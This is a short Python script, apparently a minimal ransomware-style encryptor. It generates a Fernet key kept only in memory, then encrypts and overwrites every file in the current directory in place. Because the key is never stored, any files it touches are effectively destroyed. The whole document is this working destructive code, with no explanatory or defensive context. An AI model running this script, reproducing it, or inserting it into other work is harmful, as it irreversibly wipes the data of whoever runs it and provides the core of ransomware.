from cryptography.fernet import Fernet
from os import listdir, path

KEY = Fernet.generate_key()
ENC = Fernet(KEY)

def Encrypt(file_name):
    with open(file_name, 'rb') as file:
        data = file.read()
        
    Encrypted_data = ENC.encrypt(data)
    
    with open(file_name, 'wb') as file:
        file.write(Encrypted_data)
        
target_dir = "." #variable

for item in listdir(target_dir):
    file_path = path.join(target_dir, item)
    if path.isfile(file_path):
        Encrypt(file_path)